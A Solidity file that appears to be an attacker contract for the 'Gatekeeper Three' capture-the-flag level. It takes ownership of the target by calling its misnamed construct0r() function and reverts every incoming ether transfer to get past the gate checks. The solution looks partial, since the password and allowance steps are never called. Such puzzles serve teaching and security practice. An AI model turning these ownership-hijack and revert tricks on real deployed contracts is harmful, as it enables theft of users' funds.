// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface IGatekeeperThree {
    function trick() external view returns (address);
    function construct0r() external;
    function enter() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
}

interface ISimpleTrick {
    function checkPassword(uint256 _password) external returns (bool);
    function trickInit() external;
    function trickyTrick() external;
}

contract GatekeeperThree {
    receive() external payable {}
}

contract GatekeeperThreeHacker {
    IGatekeeperThree gatekeeperThree;

    constructor(address _gatekeeperThree) {
        gatekeeperThree = IGatekeeperThree(_gatekeeperThree);
        gatekeeperThree.construct0r();
    }

    function hackEnter() external payable {
        gatekeeperThree.enter();
    }

    receive() external payable {
        revert();
    }
}
